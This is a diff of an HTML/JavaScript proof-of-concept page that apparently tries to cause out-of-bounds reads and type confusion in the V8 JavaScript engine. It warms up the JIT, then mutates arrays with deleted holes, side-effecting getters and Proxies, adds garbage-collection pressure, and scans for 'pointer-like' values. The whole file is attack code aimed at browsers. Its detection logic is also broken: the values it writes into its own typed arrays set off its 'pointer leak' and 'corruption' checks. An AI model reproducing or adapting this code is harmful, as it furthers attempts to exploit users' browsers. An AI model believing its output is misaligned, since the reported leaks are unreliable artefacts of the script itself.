@@ -1,78 +1,140 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>OOB Read PoC</title>
+<title>V8 Aggressive Near-OOB PoC - Aggressive</title>
+
+<h2>V8 Aggressive Near-OOB PoC (Aggressive)</h2>
 <pre id="log"></pre>
+
 <script>
-const log = m => document.getElementById("log").textContent += m + "\n";
+const log = m => {
+    document.getElementById("log").textContent += m + "\n";
+    console.log(m);
+};
 
 // =======================
-// WARMUP FUNCTION
+// TARGET FUNCTIONS
 // =======================
-function vuln(arr, idx){
-    // hanya baca array, tapi JIT optimizable
-    return arr[idx] + 1.1;
+function vuln(a,i){ return a[i]+1.1; }
+function target(a,i){ return a[i]+1.1; }
+
+// =======================
+// WARMUP JIT
+// =======================
+function warmup(){
+    let arr = Array.from({length:50}, (_,i)=>i+0.5);
+    for(let j=0;j<200000;j++){
+        vuln(arr,j%50);
+        target(arr,j%50);
+    }
+    return arr;
 }
 
 // =======================
-// CREATE HOLEY DOUBLE ARRAY
+// AGGRESSIVE MUTATION
 // =======================
-let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
-delete arr[1];  // bikin “hole” → hidden class berubah
-arr[3] = 3.14159;
+function mutate(arr){
+    // Banyak holes + type confusion
+    for(let i=0;i<15;i++) delete arr[i]; 
+    arr.length = 10;
+    arr[70] = 1.7976931348623157e+308; // max float64
+    arr[2] = {x:1};
+    Object.defineProperty(arr,3,{
+        get(){ arr.push(Math.random()*1e5); return 1.1; }
+    });
+    return arr;
+}
 
 // =======================
-// Aggressive getter untuk mutate array length
+// BREAK ASSUMPTION
 // =======================
-Object.defineProperty(arr, 2, {
-    get() {
-        // trigger OOB assumptions di JIT
-        arr.length = 0; // drastic structural change
-        return 42.42;
-    }
-});
+function breakAssumption(a){
+    a = new Proxy(a,{
+        get(t,p){
+            if(p==="length") for(let i=0;i<10;i++) t.push(Math.random()*1e5);
+            if(typeof p==="string" && !isNaN(p) && Math.random()<0.6) t.push(Math.random()*1e5);
+            return Reflect.get(t,p);
+        },
+        set(t,p,v){
+            if(Math.random()<0.4) t.length += 5;
+            return Reflect.set(t,p,v);
+        }
+    });
+    return a;
+}
 
 // =======================
-// TYPED ARRAY BACKING
+// TYPED ARRAYS
 // =======================
-let buf = new ArrayBuffer(0x200);
+let buf = new ArrayBuffer(0x8000);
 let f64 = new Float64Array(buf);
+let u32 = new Uint32Array(buf);
 let u8  = new Uint8Array(buf);
 
-// isi beberapa data
-for(let i=0; i<f64.length; i++){
-    f64[i] = i + 0.5;
+// =======================
+// GC PRESSURE
+// =======================
+function gcPressure(){
+    let t=[];
+    for(let i=0;i<300;i++) t.push(new ArrayBuffer(1024*1024));
 }
 
 // =======================
-// TRIGGER & CHECK OOB READ
+// CHECK NEAR-OOB
 // =======================
-for(let i=0; i<10; i++){
-    let r = vuln(arr, 1); // index yang bisa jadi OOB
-    if(typeof r !== "number"){
-        log("TYPE CONFUSION DETECTED! r=" + r);
+function checkArray(a){
+    for(let i=0;i<a.length+200;i++){
+        let v = a[i];
+        if(typeof v!=="number" && typeof v!=="object" && v!==undefined){
+            log("TYPE BREAK "+i+" "+v); return true;
+        }
+        if(typeof v==="number" && Math.abs(v)>1e12){
+            log("POINTER LIKE "+v); return true;
+        }
     }
-    if(Math.abs(r) > 1e10){
-        log("POSSIBLE OOB READ! r=" + r);
+    if(a[a.length+50]!==undefined){
+        log("NEAR-OOB READ index "+(a.length+50)+" val="+a[a.length+50]);
+        return true;
     }
+    return false;
 }
 
-// =======================
-// try read beyond array length
-// =======================
-for(let i=0; i<20; i++){
-    let val = arr[arr.length + i];
-    if(val !== undefined){
-        log("NEAR-OOB READ at index " + (arr.length + i) + " value=" + val);
+function checkTyped(){
+    for(let i=0;i<f64.length;i++){
+        let v = f64[i];
+        if(!Number.isFinite(v)){ log("FLOAT CORRUPTION "+v); return true; }
+        if(Math.abs(v)>1e12){ log("PTR LEAK "+v); return true; }
     }
+    return false;
 }
 
 // =======================
-// typed array check
+// MAIN LOOP
 // =======================
-f64[0] = 1.7976931348623157e+308; // extreme float
-if(f64[0] > 1e308){
-    log("TYPED ARRAY extreme value: " + f64[0]);
+function run(){
+    log("[*] warmup / JIT");
+    let base = warmup();
+
+    log("[*] starting aggressive near-OOB fuzzing...");
+    for(let i=0;i<500000;i++){
+        let arr = [...base];
+        arr = mutate(arr);
+        arr = breakAssumption(arr);
+
+        vuln(arr,5);
+        target(arr,4);
+
+        f64[i % f64.length] = 1.7976931348623157e+308;
+        u32[i % u32.length] = 0xffffffff;
+        u8[i % u8.length] = 0xff;
+
+        if(i%10===0) gcPressure();
+
+        if(checkArray(arr)){ log("ARRAY NEAR-OOB BREAK"); return; }
+        if(checkTyped()){ log("TYPED ARRAY CORRUPTION"); return; }
+        if(i%1000===0) log("iter "+i);
+    }
+    log("[*] finished");
 }
 
-log("[*] PoC finished");
+run();
 </script>
